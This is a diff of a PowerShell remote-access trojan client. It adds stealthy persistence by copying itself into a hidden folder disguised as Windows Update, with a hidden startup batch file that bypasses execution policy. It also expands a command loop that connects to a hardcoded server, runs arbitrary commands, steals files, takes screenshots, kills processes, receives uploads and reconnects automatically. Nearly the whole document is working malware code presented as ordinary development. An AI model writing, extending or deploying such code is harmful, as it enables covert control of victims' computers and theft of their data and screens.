@@ -8,19 +8,49 @@ if ((Get-ExecutionPolicy -Scope Process) -ne 'Bypass') {
     }
 }
 
-# Path to the startup folder
-$startupPath = [System.IO.Path]::Combine($env:APPDATA, 'Microsoft\Windows\Start Menu\Programs\Startup')
-$scriptName = 'update.ps1'
-$startupScriptPath = [System.IO.Path]::Combine($startupPath, $scriptName)
+# First section - persistence setup
+try {
+    # Use user's AppData folder instead of ProgramData
+    $persistPath = "$env:LOCALAPPDATA\Microsoft\Windows\WindowsUpdate"
+    $scriptPath = "$persistPath\services.ps1"
+    $startupPath = [System.IO.Path]::Combine($env:APPDATA, "Microsoft\Windows\Start Menu\Programs\Startup")
+    $batPath = "$startupPath\WindowsUpdate.bat"
 
-# Check if the script is already in the startup folder
-if (-not (Test-Path -Path $startupScriptPath)) {
-    try {
-        # Copy the current script to the startup folder
-        Copy-Item -Path $MyInvocation.MyCommand.Path -Destination $startupScriptPath -Force
-    } catch {
-        Write-Error "Failed to copy script to startup folder: $_"
+    # Create directory if it doesn't exist (this should work without admin rights)
+    if (-not (Test-Path $persistPath)) {
+        New-Item -ItemType Directory -Path $persistPath -Force -ErrorAction Stop | Out-Null
     }
+
+    # Copy script with error handling
+    Copy-Item -Path $MyInvocation.MyCommand.Path -Destination $scriptPath -Force -ErrorAction Stop
+
+    # Create batch file with error handling
+    $batContent = @"
+@echo off
+PowerShell -WindowStyle Hidden -ExecutionPolicy Bypass -File "$scriptPath" 
+exit
+"@
+    [System.IO.File]::WriteAllText($batPath, $batContent)
+
+    # Hide files
+    if (Test-Path $scriptPath) {
+        (Get-Item $scriptPath -Force).Attributes = 'Hidden'
+    }
+    if (Test-Path $batPath) {
+        (Get-Item $batPath -Force).Attributes = 'Hidden'
+    }
+    if (Test-Path $persistPath) {
+        (Get-Item $persistPath -Force).Attributes = 'Hidden'
+    }
+
+    # Start hidden if not already running from persist location
+    if (-not $MyInvocation.MyCommand.Path.Contains("services.ps1")) {
+        Start-Process powershell -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`"" -WindowStyle Hidden
+        exit
+    }
+
+} catch {
+    Write-Warning "Persistence setup failed: $_"
 }
 
 $server_ip = "192.168.100.6"  # Replace with the server's IP address
@@ -106,188 +136,68 @@ function Handle-Connection {
     $last_activity = Get-Date
     $connection_timeout = 30  # 30 seconds timeout
 
-    # Infinite loop to keep listening for commands
     while ($true) {
         try {
-            if (-not $client.Connected) {
+            # Test connection status
+            if (-not $client.Connected -or ($client.Client.Poll(0, [System.Net.Sockets.SelectMode]::SelectRead) -and $client.Client.Available -eq 0)) {
                 throw "Client disconnected"
             }
 
             if ($client.Available -gt 0) {
                 $bytes_read = $stream.Read($buffer, 0, $buffer.Length)
-                if ($bytes_read -eq 0) { throw "Connection closed" }
+                if ($bytes_read -eq 0) { 
+                    throw "Connection closed" 
+                }
 
-                $command = [System.Text.Encoding]::UTF8.GetString($buffer, 0, $bytes_read).Trim()
-                $last_activity = Get-Date
-
-                # Handle file download
-                if ($command -like '*$file = Get-Item -LiteralPath*') {
-                    try {
-                        # Extract file path and validate it
-                        if ($command -match '"([^"]+)"') {
-                            $filePath = $Matches[1]
-                            $filePath = [System.Management.Automation.WildcardPattern]::Escape($filePath)
-                            
-                            # Check if file exists and is accessible
-                            if (-not (Test-Path -LiteralPath $filePath -ErrorAction Stop)) {
-                                $errorMsg = "ERROR:File not found: $filePath`n"
-                                $stream.Write([Text.Encoding]::UTF8.GetBytes($errorMsg), 0, $errorMsg.Length)
-                                $stream.Flush()
-                                continue
-                            }
-
-                            # Get file info
-                            $file = Get-Item -LiteralPath $filePath -ErrorAction Stop
-                            if (-not $file) {
-                                throw "Unable to access file"
-                            }
-                            $fileSize = $file.Length
-
-                            # Send size first
-                            $sizeMsg = "SIZE:$fileSize`n"
-                            $stream.Write([Text.Encoding]::UTF8.GetBytes($sizeMsg), 0, $sizeMsg.Length)
-                            $stream.Flush()
-
-                            # Open and read file
-                            $fileStream = [System.IO.File]::OpenRead($filePath)
-                            try {
-                                $buffer = New-Object byte[] 32KB
-                                $totalRead = 0
-
-                                while ($totalRead -lt $fileSize) {
-                                    $bytesRead = $fileStream.Read($buffer, 0, $buffer.Length)
-                                    if ($bytesRead -eq 0) { break }
-
-                                    $bytes = $buffer[0..($bytesRead-1)]
-                                    $encoded = [Convert]::ToBase64String($bytes)
-                                    $chunkMsg = "CHUNK:$encoded`n"
-                                    
-                                    $stream.Write([Text.Encoding]::UTF8.GetBytes($chunkMsg), 0, $chunkMsg.Length)
-                                    $stream.Flush()
-                                    
-                                    $totalRead += $bytesRead
-
-                                    if ($totalRead % 1MB -eq 0) {
-                                        $progressMsg = "PROGRESS:$totalRead`n"
-                                        $stream.Write([Text.Encoding]::UTF8.GetBytes($progressMsg), 0, $progressMsg.Length)
-                                        $stream.Flush()
-                                    }
-                                }
-                                
-                                # Send completion
-                                $doneMsg = "DONE`n"
-                                $stream.Write([Text.Encoding]::UTF8.GetBytes($doneMsg), 0, $doneMsg.Length)
-                                $stream.Flush()
-                            }
-                            finally {
-                                if ($fileStream) {
-                                    $fileStream.Close()
-                                    $fileStream.Dispose()
-                                }
-                            }
-                        }
-                        else {
-                            throw "Invalid file path format"
-                        }
+                # Add command validation
+                try {
+                    $command = [System.Text.Encoding]::UTF8.GetString($buffer, 0, $bytes_read).Trim()
+                    
+                    # Modified command validation
+                    if ($command.StartsWith('$b64 = @"') -or 
+                        $command.StartsWith('$bytes = [Convert]::FromBase64String') -or 
+                        $command.StartsWith('[IO.File]::WriteAllBytes') -or 
+                        $command.StartsWith('$global:uploadBytes') -or
+                        $command.StartsWith('try {') -or  # Allow PowerShell try blocks
+                        $command.StartsWith('Set-Location') -or  # Allow Set-Location commands
+                        $command -eq 'dir' -or  # Allow basic commands
+                        $command -eq "(Get-Location).Path") {  # Allow path queries
+                        # Skip validation for special commands
+                        $last_activity = Get-Date
                     }
-                    catch {
-                        $errorMsg = "ERROR:$($_.Exception.Message)`n"
-                        $stream.Write([Text.Encoding]::UTF8.GetBytes($errorMsg), 0, $errorMsg.Length)
+                    # More permissive validation for PowerShell commands
+                    elseif (-not ($command -match '^[\x20-\x7E\r\n\s]*$')) {  # Allow all printable ASCII
+                        throw "Invalid command format - contains disallowed characters"
+                    }
+                    
+                    $last_activity = Get-Date
+
+                    # Rest of command handling...
+                    if ($command -eq "echo ping") {
+                        $stream.Write([System.Text.Encoding]::UTF8.GetBytes("pong`n"), 0, 5)
                         $stream.Flush()
+                        continue
                     }
-                    continue
-                }
 
-                # Handle keepalive ping
-                if ($command -eq "echo ping") {
-                    $stream.Write([System.Text.Encoding]::UTF8.GetBytes("pong"), 0, 4)
-                    continue
-                }
+                    if ($command.StartsWith("echo ping")) {
+                        $stream.Write([System.Text.Encoding]::UTF8.GetBytes("pong`n"), 0, 5)
+                        $stream.Flush()
+                        continue
+                    }
 
-                if ($command.ToLower() -eq "exit") {
-                    # Close the connection if 'exit' command is received
-                    Write-Host "[+] Closing connection..."
-                    $stream.Close()
-                    $client.Close()
-                    break
-                }
+                    if ($command.ToLower() -eq "exit") {
+                        # Close the connection if 'exit' command is received
+                        Write-Host "[+] Closing connection..."
+                        $stream.Close()
+                        $client.Close()
+                        break
+                    }
 
-                # Execute the command
-                if ($command -eq "dir") {
-                    try {
-                        $items = @()
-                        Get-ChildItem -Force -ErrorAction Continue | ForEach-Object {
-                            try {
-                                $items += "$($_.Name)|$($_.Length)|$($_.CreationTime)|$($_.LastWriteTime)|$($_.PSIsContainer)"
-                            } catch {
-                                # Skip items we can't access
-                            }
-                        }
-                        $output = if ($items.Count -gt 0) {
-                            $items -join "`n"
-                        } else {
-                            "No accessible items"
-                        }
-                    } catch {
-                        $output = "[-] Error: $_"
-                    }
-                } elseif ($command.StartsWith("Rename-Item")) {
-                    # Handle file/folder renaming
-                    try {
-                        Invoke-Expression $command
-                        $output = "OK"
-                    } catch {
-                        $output = "Error: $_"
-                    }
-                } elseif ($command.StartsWith("Remove-Item")) {
-                    # Handle file/folder deletion
-                    try {
-                        Invoke-Expression $command
-                        $output = "OK"
-                    } catch {
-                        $output = "Error: $_"
-                    }
-                } elseif ($command.StartsWith('$global:uploadBytes =')) {
-                    # Initialize upload array
-                    try {
-                        Invoke-Expression $command
-                        $output = "OK"
-                    } catch {
-                        $output = $_.Exception.Message
-                    }
-                } elseif ($command.StartsWith('$bytes =')) {
-                    # Handle chunk upload
-                    try {
-                        Invoke-Expression $command
-                        $output = "OK"
-                    } catch {
-                        $output = $_.Exception.Message
-                    }
-                } elseif ($command.StartsWith('[IO.File]::WriteAllBytes')) {
-                    # Handle final file write
-                    try {
-                        Invoke-Expression $command
-                        $output = "OK"
-                    } catch {
-                        $output = $_.Exception.Message
-                    }
-                } elseif ($command -eq "(Get-Location).Path") {
-                    # Return current directory path
-                    $output = (Get-Location).Path
-                } elseif ($command -eq "whoami") {
-                    # Return current username
-                    $output = $env:USERNAME
-                } elseif ($command.StartsWith("Set-Location")) {
-                    try {
-                        $path = $command -replace '^Set-Location -LiteralPath "(.*?)".*$', '$1'
-                        $path = $path -replace '`"', '"'
-                        
-                        Set-Location -LiteralPath $path -ErrorAction Stop
-                        
-                        # List directory contents with better error handling
-                        $items = @()
+                    # Execute the command
+                    if ($command -eq "dir") {
                         try {
-                            Get-ChildItem -Force | ForEach-Object {
+                            $items = @()
+                            Get-ChildItem -Force -ErrorAction Continue | ForEach-Object {
                                 try {
                                     $items += "$($_.Name)|$($_.Length)|$($_.CreationTime)|$($_.LastWriteTime)|$($_.PSIsContainer)"
                                 } catch {
@@ -300,237 +210,389 @@ function Handle-Connection {
                                 "No accessible items"
                             }
                         } catch {
-                            $output = "Unable to list directory contents"
+                            $output = "[-] Error: $_"
                         }
-                    } catch {
-                        $output = "[-] Error: $_"
-                    }
-                } elseif ($command.StartsWith("Get-ChildItem -Path")) {
-                    try {
-                        # Get file list silently
-                        $items = Invoke-Expression $command
-                        $output = $items -join "`n"
-                        $output += "||END"
-                        $stream.Write([System.Text.Encoding]::UTF8.GetBytes($output), 0, $output.Length)
-                        $stream.Flush()
-                    } catch {
-                        $errorMsg = "ERROR:" + $_.Exception.Message
-                        $stream.Write([System.Text.Encoding]::UTF8.GetBytes($errorMsg), 0, $errorMsg.Length)
-                    }
-                    continue
-                } elseif ($command.StartsWith("Get-ChildItem -Recurse")) {
-                    try {
-                        $path = $command -replace 'Get-ChildItem -Recurse -LiteralPath "(.*)"', '$1'
-                        if (-not (Test-Path -LiteralPath $path)) {
-                            throw "Path not found: $path"
+                    } elseif ($command.StartsWith("Rename-Item")) {
+                        # Handle file/folder renaming
+                        try {
+                            Invoke-Expression $command
+                            $output = "OK"
+                        } catch {
+                            $output = "Error: $_"
                         }
-                        
-                        $items = @()
-                        Get-ChildItem -Recurse -LiteralPath $path -ErrorAction Stop | ForEach-Object {
+                    } elseif ($command.StartsWith("Remove-Item")) {
+                        # Handle file/folder deletion
+                        try {
+                            Invoke-Expression $command
+                            $output = "OK"
+                        } catch {
+                            $output = "Error: $_"
+                        }
+                    } elseif ($command -eq "(Get-Location).Path") {
+                        # Return current directory path
+                        $output = (Get-Location).Path
+                    } elseif ($command -eq "whoami") {
+                        # Return current username
+                        $output = $env:USERNAME
+                    } elseif ($command.StartsWith("Set-Location")) {
+                        try {
+                            $path = $command -replace '^Set-Location -LiteralPath "(.*?)".*$', '$1'
+                            $path = $path -replace '`"', '"'
+                            
+                            Set-Location -LiteralPath $path -ErrorAction Stop
+                            
+                            # List directory contents with better error handling
+                            $items = @()
                             try {
-                                $items += "$($_.FullName)|$($_.Length)|$($_.CreationTime)|$($_.LastWriteTime)|$($_.PSIsContainer)"
+                                Get-ChildItem -Force | ForEach-Object {
+                                    try {
+                                        $items += "$($_.Name)|$($_.Length)|$($_.CreationTime)|$($_.LastWriteTime)|$($_.PSIsContainer)"
+                                    } catch {
+                                        # Skip items we can't access
+                                    }
+                                }
+                                $output = if ($items.Count -gt 0) {
+                                    $items -join "`n"
+                                } else {
+                                    "No accessible items"
+                                }
                             } catch {
-                                # Log access errors but continue
-                                Write-Warning "Cannot access item: $_"
+                                $output = "Unable to list directory contents"
                             }
+                        } catch {
+                            $output = "[-] Error: $_"
+                        }
+                    } elseif ($command.StartsWith("Get-ChildItem -Path")) {
+                        try {
+                            # Get file list silently
+                            $items = Invoke-Expression $command
+                            $output = $items -join "`n"
+                            $output += "||END"
+                            $stream.Write([System.Text.Encoding]::UTF8.GetBytes($output), 0, $output.Length)
+                            $stream.Flush()
+                        } catch {
+                            $errorMsg = "ERROR:" + $_.Exception.Message
+                            $stream.Write([System.Text.Encoding]::UTF8.GetBytes($errorMsg), 0, $errorMsg.Length)
+                        }
+                        continue
+                    } elseif ($command.StartsWith("Get-ChildItem -Recurse")) {
+                        try {
+                            $path = $command -replace 'Get-ChildItem -Recurse -LiteralPath "(.*)"', '$1'
+                            if (-not (Test-Path -LiteralPath $path)) {
+                                throw "Path not found: $path"
+                            }
+                            
+                            $items = @()
+                            Get-ChildItem -Recurse -LiteralPath $path -ErrorAction Stop | ForEach-Object {
+                                try {
+                                    $items += "$($_.FullName)|$($_.Length)|$($_.CreationTime)|$($_.LastWriteTime)|$($_.PSIsContainer)"
+                                } catch {
+                                    # Log access errors but continue
+                                    Write-Warning "Cannot access item: $_"
+                                }
+                            }
+                            
+                            if ($items.Count -eq 0) {
+                                throw "No accessible items found in directory"
+                            }
+                            
+                            $output = $items -join "`n"
+                            # Add clear end marker
+                            $output += "`n`n"
+                            
+                        } catch {
+                            $output = "ERROR: $_"
                         }
                         
-                        if ($items.Count -eq 0) {
-                            throw "No accessible items found in directory"
+                        # Ensure output is sent
+                        $responseBytes = [System.Text.Encoding]::UTF8.GetBytes($output)
+                        $stream.Write($responseBytes, 0, $responseBytes.Length)
+                        $stream.Flush()
+                        continue
+                    } elseif ($command.StartsWith("Get-Process")) {
+                        try {
+                            $processes = Get-Process | Select-Object ProcessName, Id, @{Name="CPU";Expression={$_.CPU}}, @{Name="Memory";Expression={[math]::Round($_.WorkingSet64/1MB, 2)}} | ForEach-Object {
+                                "$($_.ProcessName)|$($_.Id)|$(if($_.CPU){[math]::Round($_.CPU,2)}else{0})|$($_.Memory)"
+                            }
+                            $output = $processes -join "`n"
+                            if ([string]::IsNullOrEmpty($output)) {
+                                $output = "No processes found"
+                            }
+                            $stream.Write([System.Text.Encoding]::UTF8.GetBytes($output), 0, $output.Length)
+                            $stream.Flush()
+                        } catch {
+                            $errorMsg = "[-] Error: $_"
+                            $stream.Write([System.Text.Encoding]::UTF8.GetBytes($errorMsg), 0, $errorMsg.Length)
+                            $stream.Flush()
+                        }
+                        continue
+                        
+                    } elseif ($command.StartsWith("Stop-Process")) {
+                        # Handle process termination
+                        try {
+                            Invoke-Expression $command
+                            $output = "OK"
+                        } catch {
+                            $output = "[-] Error: $_"
+                        }
+                    } elseif ($command.StartsWith("Get-ChildItem")) {
+                        try {
+                            # Extract the path and clean it
+                            $path = $command -match '"([^"]+)"' | Out-Null
+                            $path = $Matches[1]
+                            
+                            if (-not (Test-Path -LiteralPath $path)) {
+                                throw "Path not found: $path"
+                            }
+                            
+                            # Get all items recursively
+                            $items = Get-ChildItem -Path $path -Recurse -Force -ErrorAction SilentlyContinue | ForEach-Object {
+                                try {
+                                    # Include full path, size, and whether it's a container (directory)
+                                    "$($_.FullName)|$($_.Length)|$($_.PSIsContainer)"
+                                } catch {
+                                    $null
+                                }
+                            }
+                            
+                            # Send the list with a clear end marker
+                            $output = ($items -join "`n") + "`r`n`r`n"
+                            $stream.Write([System.Text.Encoding]::UTF8.GetBytes($output), 0, $output.Length)
+                            $stream.Flush()
+                        }
+                        catch {
+                            $errorMsg = "ERROR: $_"
+                            $stream.Write([System.Text.Encoding]::UTF8.GetBytes($errorMsg), 0, $errorMsg.Length)
+                            $stream.Flush()
+                        }
+                        $output = ""
+
+                    } elseif ($command -eq "Get-Screenshot") {
+                        try {
+                            # Capture screenshot
+                            $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
+                            $screenshot = New-Object System.Drawing.Bitmap($bounds.Width, $bounds.Height)
+                            $graphics = [System.Drawing.Graphics]::FromImage($screenshot)
+                            $graphics.CopyFromScreen($bounds.X, $bounds.Y, 0, 0, $bounds.Size)
+                            
+                            # Convert to bytes
+                            $ms = New-Object System.IO.MemoryStream
+                            $screenshot.Save($ms, [System.Drawing.Imaging.ImageFormat]::Jpeg)
+                            $bytes = $ms.ToArray()
+                            $ms.Close()
+                            $graphics.Dispose()
+                            $screenshot.Dispose()
+                            
+                            # Send size header
+                            $size = $bytes.Length
+                            $sizeHeader = [System.Text.Encoding]::UTF8.GetBytes("SIZE:$size|")
+                            $stream.Write($sizeHeader, 0, $sizeHeader.Length)
+                            $stream.Flush()
+                            
+                            # Send image data
+                            $stream.Write($bytes, 0, $bytes.Length)
+                            $stream.Flush()
+                        }
+                        catch {
+                            $errorMsg = "ERROR: $_"
+                            $stream.Write([System.Text.Encoding]::UTF8.GetBytes($errorMsg), 0, $errorMsg.Length)
+                            $stream.Flush()
+                        }
+                        $output = ""
+                    } elseif ($command.StartsWith('$files = Get-ChildItem')) {
+                        try {
+                            # Execute command and send result
+                            $result = Invoke-Expression $command
+                            $stream.Write([System.Text.Encoding]::UTF8.GetBytes($result + "`n"), 0, $result.Length + 1)
+                            $stream.Flush()
+                        } catch {
+                            $errorMsg = "ERROR:" + $_.Exception.Message
+                            $stream.Write([System.Text.Encoding]::UTF8.GetBytes($errorMsg + "`n"), 0, $errorMsg.Length + 1)
+                        }
+                        continue
+
+                    } elseif ($command.StartsWith('$bytes = [IO.File]::ReadAllBytes')) {
+                        try {
+                            # Execute command in smaller chunks
+                            $result = Invoke-Expression $command
+                            # Send size first
+                            $stream.Write([System.Text.Encoding]::UTF8.GetBytes($result + "`n"), 0, $result.Length + 1)
+                            $stream.Flush()
+                            Start-Sleep -Milliseconds 100  # Small delay to prevent data mixing
+                        } catch {
+                            $errorMsg = "ERROR:" + $_.Exception.Message
+                            $stream.Write([System.Text.Encoding]::UTF8.GetBytes($errorMsg + "`n"), 0, $errorMsg.Length + 1)
+                        }
+                        continue
+
+                    } elseif ($command.StartsWith("[IO.File]::ReadAllBytes")) {
+                        try {
+                            # Extract the file path and clean it
+                            $path = $command -match '"([^"]+)"' | Out-Null
+                            $filePath = $Matches[1]
+                            
+                            # Verify file exists and is accessible
+                            if (-not (Test-Path -LiteralPath $filePath)) {
+                                throw "File not found: $filePath"
+                            }
+
+                            # Get file info first
+                            $fileInfo = Get-Item -LiteralPath $filePath
+                            if ($fileInfo.Length -eq 0) {
+                                throw "File is empty"
+                            }
+
+                            # Read file bytes safely
+                            $bytes = [System.IO.File]::ReadAllBytes($filePath)
+                            
+                            # Send size header first and wait for acknowledgement
+                            $sizeHeader = [System.Text.Encoding]::UTF8.GetBytes("SIZE:$($bytes.Length)|`n")
+                            $stream.Write($sizeHeader, 0, $sizeHeader.Length)
+                            $stream.Flush()
+                            Start-Sleep -Milliseconds 100  # Small delay
+                            
+                            # Now send file data
+                            $stream.Write($bytes, 0, $bytes.Length)
+                            $stream.Flush()
+                        } catch {
+                            $errorMsg = [System.Text.Encoding]::UTF8.GetBytes("ERROR: $_")
+                            $stream.Write($errorMsg, 0, $errorMsg.Length)
+                            $stream.Flush()
+                        }
+                        continue
+                    } elseif ($command.StartsWith("Get-ChildItem -Recurse -File")) {
+                        try {
+                            # Extract the path and clean it
+                            $path = $command -match '"([^"]+)"' | Out-Null
+                            $path = $Matches[1]
+                            
+                            if (-not (Test-Path -LiteralPath $path)) {
+                                throw "Path not found: $path"
+                            }
+                            
+                            # Get all files recursively
+                            $files = Get-ChildItem -Recurse -File -Path $path -ErrorAction Stop | ForEach-Object {
+                                $_.FullName
+                            }
+                            
+                            $output = $files -join "`n"
+                        } catch {
+                            $output = "ERROR: $_"
                         }
                         
-                        $output = $items -join "`n"
-                        # Add clear end marker
-                        $output += "`n`n"
-                        
-                    } catch {
-                        $output = "ERROR: $_"
+                        # Ensure output is sent
+                        $responseBytes = [System.Text.Encoding]::UTF8.GetBytes($output)
+                        $stream.Write($responseBytes, 0, $responseBytes.Length)
+                        $stream.Flush()
+                        continue
+                    } elseif ($command.StartsWith("UPLOAD:")) {
+                        try {
+                            # Parse upload info
+                            $uploadInfo = $command.Substring(7)  # Remove "UPLOAD:" prefix
+                            $fileName, $fileSize = $uploadInfo -split '\|'
+                            $fileSize = [int64]$fileSize
+                            
+                            # Send ready signal
+                            $responseBytes = [System.Text.Encoding]::UTF8.GetBytes("READY")
+                            $stream.Write($responseBytes, 0, $responseBytes.Length)
+                            $stream.Flush()
+                            
+                            # Create file and prepare for writing
+                            $filePath = Join-Path -Path (Get-Location).Path -ChildPath $fileName
+                            $fileStream = [System.IO.File]::Create($filePath)
+                            $totalReceived = 0
+                            $buffer = New-Object byte[] 8192
+                            
+                            # Receive file data
+                            while ($totalReceived -lt $fileSize) {
+                                $bytesRead = $stream.Read($buffer, 0, [Math]::Min($buffer.Length, $fileSize - $totalReceived))
+                                if ($bytesRead -eq 0) { break }
+                                
+                                $fileStream.Write($buffer, 0, $bytesRead)
+                                $totalReceived += $bytesRead
+                            }
+                            
+                            # Cleanup
+                            $fileStream.Close()
+                            $fileStream.Dispose()
+                            
+                            # Send success response
+                            $responseBytes = [System.Text.Encoding]::UTF8.GetBytes("UPLOAD_SUCCESS")
+                            $stream.Write($responseBytes, 0, $responseBytes.Length)
+                            $stream.Flush()
+                            
+                            continue
+                        }
+                        catch {
+                            if ($fileStream) {
+                                $fileStream.Close()
+                                $fileStream.Dispose()
+                            }
+                            $errorMsg = "UPLOAD_FAILED: $_"
+                            $stream.Write([System.Text.Encoding]::UTF8.GetBytes($errorMsg), 0, $errorMsg.Length)
+                            $stream.Flush()
+                            continue
+                        }
+                    } else {
+                        $output = Invoke-Expression -Command $command 2>&1
                     }
-                    
-                    # Ensure output is sent
-                    $responseBytes = [System.Text.Encoding]::UTF8.GetBytes($output)
-                    $stream.Write($responseBytes, 0, $responseBytes.Length)
+
+                    # Convert output to byte array and send it back to the server
+                    $output_bytes = [System.Text.Encoding]::UTF8.GetBytes($output)
+                    $stream.Write($output_bytes, 0, $output_bytes.Length)
+                } catch {
+                    $errorMsg = "Command validation error: $_"
+                    $stream.Write([System.Text.Encoding]::UTF8.GetBytes($errorMsg), 0, $errorMsg.Length)
                     $stream.Flush()
                     continue
-                } elseif ($command.StartsWith("Get-Process")) {
-                    # Handle process listing
-                    try {
-                        $output = Invoke-Expression $command 2>&1 | Out-String
-                    } catch {
-                        $output = "[-] Error: $_"
-                    }
-                } elseif ($command.StartsWith("Stop-Process")) {
-                    # Handle process termination
-                    try {
-                        Invoke-Expression $command
-                        $output = "OK"
-                    } catch {
-                        $output = "[-] Error: $_"
-                    }
-                } elseif ($command.StartsWith("Get-ChildItem")) {
-                    try {
-                        # Extract the path and clean it
-                        $path = $command -match '"([^"]+)"' | Out-Null
-                        $path = $Matches[1]
-                        
-                        if (-not (Test-Path -LiteralPath $path)) {
-                            throw "Path not found: $path"
-                        }
-                        
-                        # Get all items recursively
-                        $items = Get-ChildItem -Path $path -Recurse -Force -ErrorAction SilentlyContinue | ForEach-Object {
-                            try {
-                                # Include full path, size, and whether it's a container (directory)
-                                "$($_.FullName)|$($_.Length)|$($_.PSIsContainer)"
-                            } catch {
-                                $null
-                            }
-                        }
-                        
-                        # Send the list with a clear end marker
-                        $output = ($items -join "`n") + "`r`n`r`n"
-                        $stream.Write([System.Text.Encoding]::UTF8.GetBytes($output), 0, $output.Length)
-                        $stream.Flush()
-                    }
-                    catch {
-                        $errorMsg = "ERROR: $_"
-                        $stream.Write([System.Text.Encoding]::UTF8.GetBytes($errorMsg), 0, $errorMsg.Length)
-                        $stream.Flush()
-                    }
-                    $output = ""
-
-                } elseif ($command -eq "Get-Screenshot") {
-                    try {
-                        # Capture screenshot
-                        $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
-                        $screenshot = New-Object System.Drawing.Bitmap($bounds.Width, $bounds.Height)
-                        $graphics = [System.Drawing.Graphics]::FromImage($screenshot)
-                        $graphics.CopyFromScreen($bounds.X, $bounds.Y, 0, 0, $bounds.Size)
-                        
-                        # Convert to bytes
-                        $ms = New-Object System.IO.MemoryStream
-                        $screenshot.Save($ms, [System.Drawing.Imaging.ImageFormat]::Jpeg)
-                        $bytes = $ms.ToArray()
-                        $ms.Close()
-                        $graphics.Dispose()
-                        $screenshot.Dispose()
-                        
-                        # Send size header
-                        $size = $bytes.Length
-                        $sizeHeader = [System.Text.Encoding]::UTF8.GetBytes("SIZE:$size|")
-                        $stream.Write($sizeHeader, 0, $sizeHeader.Length)
-                        $stream.Flush()
-                        
-                        # Send image data
-                        $stream.Write($bytes, 0, $bytes.Length)
-                        $stream.Flush()
-                    }
-                    catch {
-                        $errorMsg = "ERROR: $_"
-                        $stream.Write([System.Text.Encoding]::UTF8.GetBytes($errorMsg), 0, $errorMsg.Length)
-                        $stream.Flush()
-                    }
-                    $output = ""
-                } elseif ($command.StartsWith('$files = Get-ChildItem')) {
-                    try {
-                        # Execute command and send result
-                        $result = Invoke-Expression $command
-                        $stream.Write([System.Text.Encoding]::UTF8.GetBytes($result + "`n"), 0, $result.Length + 1)
-                        $stream.Flush()
-                    } catch {
-                        $errorMsg = "ERROR:" + $_.Exception.Message
-                        $stream.Write([System.Text.Encoding]::UTF8.GetBytes($errorMsg + "`n"), 0, $errorMsg.Length + 1)
-                    }
-                    continue
-
-                } elseif ($command.StartsWith('$bytes = [IO.File]::ReadAllBytes')) {
-                    try {
-                        # Execute command in smaller chunks
-                        $result = Invoke-Expression $command
-                        # Send size first
-                        $stream.Write([System.Text.Encoding]::UTF8.GetBytes($result + "`n"), 0, $result.Length + 1)
-                        $stream.Flush()
-                        Start-Sleep -Milliseconds 100  # Small delay to prevent data mixing
-                    } catch {
-                        $errorMsg = "ERROR:" + $_.Exception.Message
-                        $stream.Write([System.Text.Encoding]::UTF8.GetBytes($errorMsg + "`n"), 0, $errorMsg.Length + 1)
-                    }
-                    continue
-
-                } elseif ($command.StartsWith("[IO.File]::ReadAllBytes")) {
-                    try {
-                        # Extract the file path and clean it
-                        $path = $command -match '"([^"]+)"' | Out-Null
-                        $filePath = $Matches[1]
-                        
-                        # Verify file exists and is accessible
-                        if (-not (Test-Path -LiteralPath $filePath)) {
-                            throw "File not found: $filePath"
-                        }
-
-                        # Get file info first
-                        $fileInfo = Get-Item -LiteralPath $filePath
-                        if ($fileInfo.Length -eq 0) {
-                            throw "File is empty"
-                        }
-
-                        # Read file bytes safely
-                        $bytes = [System.IO.File]::ReadAllBytes($filePath)
-                        
-                        # Send size header
-                        $sizeHeader = [System.Text.Encoding]::UTF8.GetBytes("SIZE:$($bytes.Length)|")
-                        $stream.Write($sizeHeader, 0, $sizeHeader.Length)
-                        $stream.Flush()
-                        
-                        # Send file data
-                        $stream.Write($bytes, 0, $bytes.Length)
-                        $stream.Flush()
-                    } catch {
-                        $errorMsg = "ERROR: $_"
-                        $stream.Write([System.Text.Encoding]::UTF8.GetBytes($errorMsg), 0, $errorMsg.Length)
-                        $stream.Flush()
-                    }
-                    continue
-                } elseif ($command.StartsWith("Get-ChildItem -Recurse -File")) {
-                    try {
-                        # Extract the path and clean it
-                        $path = $command -match '"([^"]+)"' | Out-Null
-                        $path = $Matches[1]
-                        
-                        if (-not (Test-Path -LiteralPath $path)) {
-                            throw "Path not found: $path"
-                        }
-                        
-                        # Get all files recursively
-                        $files = Get-ChildItem -Recurse -File -Path $path -ErrorAction Stop | ForEach-Object {
-                            $_.FullName
-                        }
-                        
-                        $output = $files -join "`n"
-                    } catch {
-                        $output = "ERROR: $_"
-                    }
-                    
-                    # Ensure output is sent
-                    $responseBytes = [System.Text.Encoding]::UTF8.GetBytes($output)
-                    $stream.Write($responseBytes, 0, $responseBytes.Length)
-                    $stream.Flush()
-                    continue
-                } else {
-                    $output = Invoke-Expression -Command $command 2>&1
                 }
-
-                # Convert output to byte array and send it back to the server
-                $output_bytes = [System.Text.Encoding]::UTF8.GetBytes($output)
-                $stream.Write($output_bytes, 0, $output_bytes.Length)
             }
             else {
+                # Add keepalive check
+                $current_time = Get-Date
+                if (($current_time - $last_activity).TotalSeconds -gt 10) {
+                    try {
+                        $client.Client.Send([byte[]]@(0), 0, 0)
+                    } catch {
+                        throw "Connection lost during keepalive"
+                    }
+                }
                 Start-Sleep -Milliseconds 100
             }
         }
         catch {
             Write-Host "[-] Connection error: $_"
-            break
+            
+            # Cleanup
+            if ($client) { 
+                $client.Close()
+                $client.Dispose()
+            }
+            if ($stream) {
+                $stream.Close()
+                $stream.Dispose()
+            }
+
+            Write-Host "Connection lost. Attempting to reconnect..."
+            Start-Sleep -Seconds 5
+            
+            try {
+                # Try to reconnect
+                $client = New-Object System.Net.Sockets.TCPClient
+                Write-Host "Attempting to connect to $server_ip on port $server_port..."
+                $client.Connect($server_ip, $server_port)
+                if ($client.Connected) {
+                    $stream = $client.GetStream()
+                    $last_activity = Get-Date
+                    Write-Host "Successfully reconnected!"
+                    continue
+                }
+            }
+            catch {
+                Write-Host "Reconnection failed: $_"
+                Start-Sleep -Seconds 5
+                continue
+            }
         }
     }
 
@@ -542,6 +604,17 @@ function Handle-Connection {
     if ($stream) {
         $stream.Close()
         $stream.Dispose()
+    }
+
+    # Attempt to reconnect
+    Write-Host "Attempting to reconnect..."
+    Start-Sleep -Seconds 5
+    $client, $stream = Connect-ToServer -server_ip $server_ip -server_port $server_port
+    if ($client.Connected) {
+        Write-Host "Reconnected successfully."
+        Handle-Connection -client $client -stream $stream
+    } else {
